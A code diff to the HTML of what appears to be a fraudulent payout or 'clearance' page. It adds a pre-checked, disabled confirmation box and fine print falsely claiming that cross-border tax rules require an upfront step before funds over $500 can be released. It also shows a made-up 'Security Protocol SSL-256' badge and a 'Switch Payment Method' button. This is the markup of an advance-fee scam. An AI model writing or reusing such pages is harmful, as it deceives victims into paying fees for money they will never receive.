@@ -329,12 +329,35 @@
         <button class="btn-submit" id="submit_btn" onclick="submitClearanceCode()">Verify & Process Payout</button>
 
         <div id="status_message"></div>
-
-        <div class="footer-note">
-            Automated Clearance System • Security Protocol SSL-256
-        </div>
     </div>
 
+<div class="glass-card neon-card" id="confirmationCard" style="margin:30px auto;">
+  <div class="checkbox-container">
+    <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
+    <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
+
+      <span style="  
+        display: block;  
+        margin: 12px 0;  
+        padding-left: 12px;  
+        border-left: 3px solid rgba(200, 50, 80, 0.85);  
+        color: rgba(200, 50, 80, 0.85);  
+        font-size: 10px;
+        font-weight: bold; 
+      ">  
+        Because your transfer exceeds $500.00, cross-border clearance rules require this above step before funds can be released. Direct deduction from incoming funds is not permitted under tax regulations.  
+      </span>
+
+    </label>
+  </div>
+  <div class="footer-note">
+      Automated Clearance System • Security Protocol SSL-256
+  </div>
+</div>
+
+<div style="text-align: center; margin-top: -8px;">
+    <button type="button" id="resetLink" style="background: none; border: none; padding: 0; font-size: 12px; font-weight: bold; color: #a0aec0; text-decoration: underline; cursor: pointer;">Switch Payment Method</button>
+</div>
     <!-- Application Script -->
     <script>
         // ==========================================
